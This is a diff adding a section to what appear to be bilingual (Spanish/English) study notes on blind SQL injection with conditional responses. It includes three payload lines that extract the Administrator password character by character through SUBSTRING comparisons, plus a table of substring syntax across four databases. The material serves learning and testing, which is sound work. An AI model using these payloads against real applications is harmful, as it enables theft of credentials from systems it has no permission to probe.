@@ -74,6 +74,18 @@ es importante notar que el query va a ser igual, si son 2 columnas, se va a util
 
 It arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
 
+<< TRIGGERING CONDITIONAL RESPONSES
 
+Es por medio de condiciones booleanas, de manera que se genera una consulta para validar espacio por espacio, (letra x letra o numero x numero). El comportamiento del
+sitio va a definir si es TRUE/FALSE. Se usan mayor que y menor que para identificar el rango de posicion a buscar y el signo igual para igualar el valor y comprobar si es el correcto. (* ver query ejemplo)
+
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'y
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+
+Oracle	SUBSTR('string', 4, 2)
+Microsoft	SUBSTRING('string', 4, 2)
+PostgreSQL	SUBSTRING('string', 4, 2)
+MySQL	SUBSTRING('string', 4, 2)
 
 
